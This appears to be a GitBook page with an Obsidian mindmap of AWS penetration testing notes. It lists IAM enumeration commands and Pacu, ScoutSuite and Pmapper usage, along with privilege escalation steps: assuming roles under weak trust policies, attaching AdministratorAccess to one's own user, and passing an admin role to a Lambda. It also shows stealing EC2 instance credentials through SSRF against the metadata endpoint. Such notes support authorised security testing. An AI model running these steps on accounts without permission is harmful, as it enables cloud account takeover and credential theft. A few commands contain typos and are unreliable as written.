---
description: >-
  There is a picture which is created by Obsidian (Enhancing Mindmap)plugin and
  also markdown text of that. You can basically copy and paste to your own
  obsidian vault and continue to recreate that.
---

# Intro \[WIP]

<img src="../.gitbook/assets/image (1).png" alt="" data-size="original">



```


---

mindmap-plugin: basic

---

# AWS Penetration Test

## Enumeration
- User Enumeration
   - `aws iam list-users`
   - `aws iam list-groups-for-user --user-name <username>`
   - `aws iam list-user-policies --user-name <username>`
   - `aws iam list-attached-user-policies --user-name <username>`
   - `aws iam list-signin-certificates --user-name <username>`
   - `aws iam list-signing-certificates --user-name`
   - `aws iam get-ssh-public-key --user-name <username> --encoding <PEM> --ssh-public-key-id  <...>`
   - `aws iam list-mfa-devices`
   - `aws iam list-virtual-mfa-devices`
   - `aws iam get-login-profile --user-name <username>`
- Group Enumeration
   - `aws iam list-groups`
   - `aws iam list-group-policies --group-name <group name>`
   - `aws iam get-policy --policy-arn <arn:aws:iam::aws:policy/Administrator Access>`
   - `aws iam list-attached-group-policies --group-name <group name>`
   - `aws iam get-policy-version --policy-arn <arn:aws:iam::aws:policy/Administrator Access> --version-id <v1>`
   - `aws iam list-attached-group-policies --group-name <ad-production>`
   - `aws iam list-policies`
- Roles Enumeration
   - `aws iam list-roles`
   - `aws iam get-role --role-name <rolename>`
   - `aws iam list-role-policies --role-name <rolename`>
   - `aws iam list-role-attached-policies --role-name <rolename`>
- Pacu Tool
   - `run iam__enum_users_roles_policies_groups`
      - `data`
   - `run iam__bruteforce_permission`
   - `run s3__download_bucket`
   - `run dynomodb__enum`
   - `run ec2__enum`
- ScoutSuite tool
   - python3 scout.py aws
- Pmapper tool
   - pmapper graph create
   - pmapper graph list
   - pmapper query "preset privesc"
   - pmapper analysis --output-type text
- enumerate-iam
   - `python3 --access-key asdfasdf -secret-key asdfasdf --region`
- Cross Account User/Role Enumeration
   - `<#in pacu> run iam__enum_roles --role-name <controlled by Attacker> --account-id <attackerid> --word-list </somefile.txt>`
   - `<#in pacu> run iam__enum_users --role-name <controlled by Attacker> --account-id <attackerid> --word-list </somefile.txt>`

## Privilege Escalation
- Misconfigured Trust Policy
   - `aws sts assume-role --role-arn <arn:aws:iam::..............:role/.........> --role-session-name <your input> `
      - `aws sts get-caller-identity`
      - `aws iam list-attached-role-policies --role-name <you have put in first commad>`
      - `aws s3 ls`
- Overly Permissive Permission
   - `aws iam get-policy --policy-arn <customer managed policy>`
      - `aws iam get-policy-version --policy-arn <customer managed> --version-id <versions of it>`
      - Look here if there is that kind of a privileges https://turme.gitbook.io/blog/aws-penetration-test/privilege-escalation
      - `aws iam list-policies | grep 'AdministratorAccess'`
      - `aws iam attach-user-policy --user-name <give username> --policy-arn <policy with Administrative access>`
- Passing Role To Services
   - Check if you have a passRole ability and also create lambda function
      - if you have both create lambda funciton and pass role administrator to that

## Attacks on EC2
- If you find SSRF attack on application
   - `curl http://169.254.169.254/latest/meta-data/iam/security-credentials`
      - Get tokens of that EC2 instance
```
